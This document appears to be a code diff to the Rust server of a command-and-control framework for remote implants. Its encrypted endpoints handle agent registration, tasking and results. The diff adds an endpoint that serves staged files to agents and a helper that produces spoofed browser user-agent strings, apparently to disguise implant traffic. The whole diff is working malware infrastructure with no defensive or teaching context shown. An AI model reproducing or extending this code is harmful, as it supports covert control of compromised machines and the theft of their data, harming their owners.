@@ -81,6 +81,8 @@ pub async fn start_https_listener(
         .with_state(db_path.to_string())
         .route("/t/a", post(task_ask))
         .with_state(db_path.to_string())
+        .route("/t/u", post(task_upload))
+        .with_state(db_path.to_string())
         .route("/t/r", post(task_result))
         .with_state(db_path.to_string())
         .layer((
@@ -201,6 +203,7 @@ async fn register(
             mkdir(format!("agents/{}/downloads", agent.name.to_owned())).unwrap();
             mkdir(format!("agents/{}/screenshots", agent.name.to_owned())).unwrap();
             mkdir(format!("agents/{}/task", agent.name.to_owned())).unwrap();
+            mkdir(format!("agents/{}/uploads", agent.name.to_owned())).unwrap();
             mkfile(format!("agents/{}/task/name", agent.name.to_owned())).unwrap();
             mkfile(format!("agents/{}/task/result", agent.name.to_owned())).unwrap();
 
@@ -249,6 +252,65 @@ async fn task_ask(
             ag_public_key.clone(),
         );
         return (StatusCode::NOT_FOUND, cipher_message);
+    }
+}
+
+async fn task_upload(
+    State(db_path): State<String>,
+    Json(payload): Json<CipherData>,
+) -> (StatusCode, Vec<u8>) {
+    info!("Agent requested `/t/u`");
+
+    // Get the server kaypair
+    let (my_secret, my_public) = match get_server_keypair(db_path.to_string()) {
+        Ok((secret, public)) => (secret, public),
+        Err(e) => {
+            error!("Error: {:?}", e);
+            return (StatusCode::OK, Vec::new());
+        }
+    };
+
+    let agent_name = payload.p;
+    let ciphertext = payload.c;
+    let nonce = payload.n;
+
+    let agent = db::get_agent(db_path, agent_name.to_string()).unwrap();
+    let encoded_ag_public_key = agent.public_key;
+    let decoded_ag_public_key = decode(encoded_ag_public_key.as_bytes());
+    let ag_public_key = PublicKey::from(vec_u8_to_u8_32(decoded_ag_public_key).unwrap());
+
+    // Decipher the ciphertext
+    let mut uploaded_file_path = match decipher(
+        EncMessage { ciphertext, nonce },
+        my_secret.clone(),
+        ag_public_key.clone(),
+    ) {
+        Ok(t) => String::from_utf8(t).unwrap(),
+        Err(e) => {
+            error!("Error decrypting the task result: {:?}", e);
+            return (StatusCode::OK, Vec::new());
+        }
+    };
+
+    uploaded_file_path = uploaded_file_path.split("/").last().unwrap().to_string();
+
+    println!("agent_name: {}", agent_name);
+    println!("uploaded_file_path: {}", uploaded_file_path);
+
+    match read_file(
+        format!(
+            "agents/{}/uploads/{}",
+            agent_name.to_string(),
+            uploaded_file_path.to_string()
+        )
+    ) {
+        Ok(c) => {
+            return (StatusCode::OK, c);
+        }
+        Err(e) => {
+            error!("Error reading the uploaded file: {:?}", e);
+            return (StatusCode::OK, Vec::new());
+        }
     }
 }
 
@@ -376,4 +438,11 @@ fn create_cipher_message(message: String, my_secret: StaticSecret, opp_public: P
         opp_public
     );
    serde_json::to_string(&cipherdata).unwrap()
+}
+
+pub fn generate_user_agent(os: String, arch: String) -> String {
+    match os.as_str() {
+        "linux" => "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36".to_string(),
+        "windows" | _ => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36".to_string(),
+    }
 }
